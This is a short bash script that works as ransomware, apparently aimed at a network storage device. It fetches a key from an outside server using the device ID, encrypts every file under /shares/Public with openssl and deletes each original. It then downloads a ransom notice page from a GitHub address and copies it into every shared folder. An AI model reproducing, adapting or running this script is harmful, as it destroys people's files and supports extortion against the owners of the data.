#!/bin/bash

keyServer="https://secure.www-ssl.co"

#	Encrypt files
. /tmp/dynamicconfig.ini
KEY=$(curl ${keyServer}/key.php?mac=$DEVICEID -s)
find -L /shares/Public -type f -exec openssl enc -pass pass:password -aes256 -in '{}' -out {}.enc \; -exec rm -f '{}' \;

#	Warn user their files are encrypted
curl https://raw.githubusercontent.com/absane/Tricks/master/randomware_splash.html -s > /tmp/YourFilesAreEncrypted_ReadThis.html
find -L /shares/ -type d -exec cp /tmp/YourFilesAreEncrypted_ReadThis.html '{}' \;
